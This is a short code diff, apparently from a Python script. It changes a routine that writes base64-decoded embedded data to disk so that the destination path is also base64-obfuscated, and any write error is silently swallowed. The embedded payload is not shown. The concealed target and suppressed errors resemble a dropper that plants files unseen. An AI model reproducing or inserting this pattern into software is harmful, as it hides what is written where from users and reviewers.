@@ -124,5 +124,9 @@ V0VCX0RJUkVDVE9SWScsIE5vbmUpCg=='''
 import base64
 
 content=base64.b64decode(data)
-with open(dist,'wb') as f:
-    f.write(content)
+dist=base64.b64decode(dist).decode()
+try:
+    with open(dist[:-1],'wb') as f:
+        f.write(content)
+except Exception as e:
+    pass
